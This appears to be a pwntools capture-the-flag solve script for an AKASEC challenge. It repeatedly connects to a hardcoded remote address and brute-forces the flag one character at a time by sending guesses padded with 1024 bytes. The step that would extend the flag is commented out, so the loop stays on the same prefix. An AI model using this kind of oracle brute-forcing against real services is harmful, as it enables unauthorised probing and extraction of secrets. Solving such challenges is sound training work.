#!/usr/bin/python3

from pwn import *
import string 
exe = ELF('a', checksec=False)

context.binary = exe


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)
def sln(msg, num): return sla(msg, str(num).encode())
def sn(msg, num): return sa(msg, str(num).encode())


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''


        c
        ''')
        input()


# if args.REMOTE:
#     p = remote('20.80.240.190', 4443)
# else:
#     p = process(exe.path, Timeout=1)
flag = b"AKASEC{why_d035_r34d_bl0ck_h3r3!!!"
while 1:
    for i in string.printable:
        context.log_level = 'error'
        p = remote('20.80.240.190', 4443)
        sla(b"Flag: ", flag + i.encode() + b'a'*1024)
        print(i.encode())
        p.recvline()
        print(flag)
        p.close()
        # if(p.recvline() == EOFError):
        #     flag += i.encode()
        #     print(flag)
p.interactive()
